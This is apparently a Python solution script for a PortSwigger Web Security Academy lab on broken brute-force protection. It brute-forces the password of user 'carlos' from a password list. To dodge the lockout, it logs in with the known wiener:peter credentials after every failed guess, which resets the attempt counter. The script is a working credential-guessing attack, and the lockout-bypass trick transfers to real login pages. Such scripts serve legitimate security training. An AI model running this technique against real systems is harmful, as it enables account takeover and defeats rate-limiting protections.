from listgen import *
import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: Broken brute-force protection, IP block')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

USERNAME = 'carlos'
r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")

# BRUTEFORCE PASSWORD AND LOGIN
for password in passlist():

    r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers={"Cookie":f"session={session}"}, data={"username":f"{USERNAME}","password":f"{password}"})
    
    if "Incorrect password" in r.text:
        # LOGIN WITH VALID CREDENTIALS TO PREVENT LOCKOUT
        r = requests.post("https://" + lab.id + f".web-security-academy.net/login", headers={"Cookie":f"session={session}"}, data={"username":"wiener","password":"peter"})
        continue
    elif "Incorrect password" not in r.text:
        print(f"Found valid credentials {USERNAME}:{password}")
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
